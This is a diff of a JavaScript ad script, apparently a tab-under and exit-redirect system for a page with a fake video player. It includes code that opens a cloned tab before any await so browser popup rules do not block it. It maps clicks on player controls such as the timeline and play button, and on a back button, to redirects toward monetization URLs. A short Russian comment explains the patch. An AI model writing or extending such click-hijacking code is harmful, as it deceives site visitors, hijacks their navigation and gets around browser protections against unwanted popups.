@@ -4,8 +4,9 @@
    Supports: mainExit, tabUnderClick, back, reverse, autoexit
 
    Patch:
-   - open clone tab BEFORE any await (prevents popup-block / delays)
-   - clone url includes __skipPreview=1 (so preview script can skip second fake-play)
+   - open clone tab BEFORE any await (popup rules)
+   - clone url includes __skipPreview=1
+   - IMPORTANT: micro clicks BEFORE ready are swallowed (no random redirects)
 */
 
 (() => {
@@ -104,7 +105,6 @@
     Object.entries(appCfg).forEach(([k, v]) => {
       if (v == null || v === "" || k === "domain") return;
 
-      // <exit>_currentTab_zoneId / <exit>_newTab_zoneId / <exit>_currentTab_url / ...
       let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
       if (m) {
         const [, name, tab, field] = m;
@@ -114,15 +114,13 @@
         return;
       }
 
-      // <exit>_count / <exit>_timeToRedirect / <exit>_pageUrl
       m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
       if (m) {
         ensure(m[1])[m[2]] = v;
         return;
       }
 
-      // <exit>_zoneId / <exit>_url
-      // IMPORTANT: tabUnderClick_* by default = newTab
+      // tabUnderClick_* by default = newTab
       m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
       if (m) {
         const [, name, field] = m;
@@ -167,7 +165,6 @@
 
     let qs = qsFromObj(base);
 
-    // optional passParamToParams
     if (Array.isArray(passParamToParams)) {
       try {
         passParamToParams.forEach(({ from, to, joinWith }) => {
@@ -226,7 +223,6 @@
 
     const qs = await buildExitQS({ zoneId: b.zoneId });
 
-    // for your back.html router
     if (b.url) {
       qs.set("url", String(b.url));
     } else {
@@ -372,7 +368,7 @@
   const buildCloneUrl = () => {
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
-    u.searchParams.set("__skipPreview", "1"); // <— so clone can skip preview/replay
+    u.searchParams.set("__skipPreview", "1");
     return u.toString();
   };
 
@@ -386,22 +382,19 @@
   };
 
   const runMicroHandoff = async (cfg) => {
-    if (isClone) return; // clone never creates clones
+    if (isClone) return;
 
-    // one per session (per browser tab sessionStorage)
     if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
       return run(cfg, "mainExit");
     }
 
-    // set immediately (sync)
     safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
 
-    // IMPORTANT: open clone tab BEFORE any await (popup rules)
+    // popup-safe: open clone BEFORE await
     const cloneUrl = buildCloneUrl();
     safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
     openTab(cloneUrl);
 
-    // now compute monetization url (can be async, doesn't affect popup)
     const monetUrl = await buildTabUnderUrl(cfg);
 
     if (monetUrl) {
@@ -418,7 +411,6 @@
   const initClickMap = (cfg) => {
     const fired = { mainExit: false, back: false };
 
-    // MICRO targets (per your layout)
     const microTargets = new Set([
       "timeline",
       "play_pause",
@@ -433,7 +425,7 @@
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
 
-      // Back stays as "back exit"
+      // Back
       if (t === "back_button") {
         if (fired.back) return;
         fired.back = true;
@@ -443,7 +435,7 @@
         return;
       }
 
-      // CLONE behavior: ANY click anywhere -> mainExit (no micro, no ready gate)
+      // CLONE: any click -> mainExit
       if (isClone) {
         if (fired.mainExit) return;
         fired.mainExit = true;
@@ -453,8 +445,15 @@
         return;
       }
 
-      // v1: until READY do not intercept (let preview start logic work)
-      if (!isPlayerReady()) return;
+      // ---- PATCH: swallow MICRO clicks before READY ----
+      // Это убирает “странные редиректы”, если юзер тыкает по контролам до появления ready.
+      if (!isPlayerReady()) {
+        if (microTargets.has(t)) {
+          e.preventDefault();
+          e.stopPropagation();
+        }
+        return;
+      }
 
       // v1 MICRO
       if (microTargets.has(t)) {
